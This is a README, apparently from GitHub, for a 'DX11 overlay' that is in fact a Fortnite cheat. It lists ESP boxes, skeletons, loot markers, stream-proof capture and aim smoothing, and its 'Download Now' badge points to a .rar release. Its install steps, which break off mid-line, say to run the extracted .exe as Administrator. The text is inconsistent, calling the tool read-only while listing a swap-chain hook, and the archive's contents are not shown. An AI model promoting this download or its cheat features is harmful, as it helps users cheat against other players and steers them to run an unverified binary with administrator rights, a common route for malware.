<div align="center">

# ⬡ dx11-overlay

**A clean, external DirectX 11 overlay for Windows.**

![C++](https://img.shields.io/badge/C%2B%2B-20-00599C?style=flat-square&logo=cplusplus&logoColor=white)
![DX11](https://img.shields.io/badge/DirectX-11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-2ea44f?style=flat-square)

</div>

<div align="center">
  
[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/teamdaimyoabyss/fortnite-external/releases/download/dx11-overlay/dx11-overlay.rar)

</div>

<img width="1600" height="900" alt="image" src="https://github.com/user-attachments/assets/2aad86ff-a52f-4443-b59f-5bfb57f118ea" />


</div>

---

## ✦ Overview

A self-contained DX11 overlay that attaches to a target process and renders
an ImGui HUD on top of it. External by design: it reads state through
`ReadProcessMemory`, renders in its own swap chain, and never touches the
target's memory or code.

| | |
|---|---|
| **Mode** | External, user-mode |
| **Renderer** | DirectX 11 + ImGui |
| **Access** | Read-only process memory |
| **Footprint** | ~2 MB, no persistent files |

---

## ✦ Modules

<table>
<tr>
<td width="50%" valign="top">

### ◈ Renderer
- DX11 swap-chain hook
- ImGui backend, dark theme
- DPI-aware layout
- Stream-proof capture mode

### ◈ Target reader
- `ReadProcessMemory` wrapper
- Snapshot-based entity list
- Bounding-box + distance math

</td>
<td width="50%" valign="top">

### ◈ Visualizer
- 2D boxes over entities
- 3D skeleton from bone matrices
- Distance labels, health bars
- Minimap widget
- Loot / container markers

### ◈ Input
- Hotkey config, toggle & hold
- Smoothing curves
- Per-target switch delay

</td>
</tr>
</table>

---

## ✦ 

```bash
1. Download the latest release archive
2. Extract to a folder OUTSIDE of the Fortnite directory
3. Run .exe as Administrator
4. Press INSERT to open 
